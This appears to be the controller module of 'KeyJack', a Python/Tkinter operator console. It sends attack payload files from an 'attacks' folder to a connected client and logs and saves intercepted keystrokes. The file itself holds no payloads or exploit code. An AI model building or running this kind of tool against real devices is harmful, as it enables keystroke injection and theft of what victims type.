import os
import shutil
from tkinter import filedialog, messagebox

class KeyJackController:
    def __init__(self, gui, network):
        self.gui = gui
        self.network = network

        # Connect network events to controller methods
        self.network.on_connect = self.on_client_connect
        self.network.on_disconnect = self.on_client_disconnect
        self.network.on_receive = self.on_client_receive
        self.network.on_send = self.on_message_sent
        self.network.on_send_fail = self.on_message_send_fail

        # Initialize the network
        self.network.setup_network()

    def on_second_select(self, event):
        print("on_second_select")
        selected = self.gui.second_combobox.get()
        subfolder = selected if selected != 'All Files' else None
        self.load_file_list(subfolder)

    def load_subfolder_list(self):
        subfolders = ['All Files']
        for item in os.listdir(self.gui.attacks_dir):
            if os.path.isdir(os.path.join(self.gui.attacks_dir, item)):
                subfolders.append(item)
        self.gui.load_subfolder_list(subfolders)

    def load_file_list(self, subfolder=None):
        options = []
        search_dir = os.path.join(self.gui.attacks_dir, subfolder) if subfolder else self.gui.attacks_dir
        for root, dirs, files in os.walk(search_dir):
            for f in files:
                relative_path = os.path.relpath(os.path.join(root, f), self.gui.attacks_dir)
                options.append(relative_path)
        self.gui.load_file_list(options)

    def on_file_select(self, event):
        selected = self.gui.file_combobox.get()
        full_path = os.path.join(self.gui.attacks_dir, selected)
        self.gui.update_file_description(f"Selected file: {full_path}")

    def handle_sending(self):
        selected_file = self.gui.file_combobox.get()
        if selected_file:
            file_path = os.path.join(self.gui.attacks_dir, selected_file)
            if os.path.isfile(file_path):
                try:
                    with open(file_path, 'r') as file:
                        content = file.read()
                    if content:
                        self.network.send_message_to_client(content)
                    else:
                        self.gui.update_command_center("Error: File is empty.")
                except FileNotFoundError:
                    self.gui.update_command_center(f"Error: File '{file_path}' not found.")
                except Exception as e:
                    self.gui.update_command_center(f"Error reading file: {str(e)}")
            else:
                self.gui.update_command_center("Selected item is a directory, not a file.")
        else:
            self.gui.update_command_center("No file selected from the list.")

    def upload_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            file_name = os.path.basename(file_path)
            destination = os.path.join(self.gui.attacks_dir, file_name)
            shutil.copy2(file_path, destination)
            self.load_subfolder_list()
            messagebox.showinfo("File Upload", f"{file_name} has been uploaded to the attacks directory.")
        else:
            messagebox.showinfo("File Upload", "No file selected.")

    def save_keystrokes(self):
        if not self.gui.intercepted_keystrokes_area.get("1.0", "end-1c").strip():
            messagebox.showinfo("Save Keystrokes", "No keystrokes to save.")
            return

        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'w') as f:
                f.write(self.gui.intercepted_keystrokes_area.get("1.0", "end-1c"))
            messagebox.showinfo("Save Keystrokes", f"Keystrokes saved to {file_path}")
            self.gui.intercepted_keystrokes_area.delete("1.0", "end-1c")
        else:
            messagebox.showinfo("Save Keystrokes", "Save operation cancelled.")

    def on_client_connect(self):
        self.gui.update_status("CONNECTED", "#00FF00")

    def on_client_disconnect(self):
        self.gui.update_status("DISCONNECTED", "#FF0000")

    def on_client_receive(self, data):
        self.gui.update_intercepted_keystrokes(data)

    def on_message_sent(self, message):
        self.gui.update_command_center(f"Sent: {message}")

    def on_message_send_fail(self):
        self.gui.update_command_center("Failed to send message.")

    def on_closing(self):
        self.network.close()

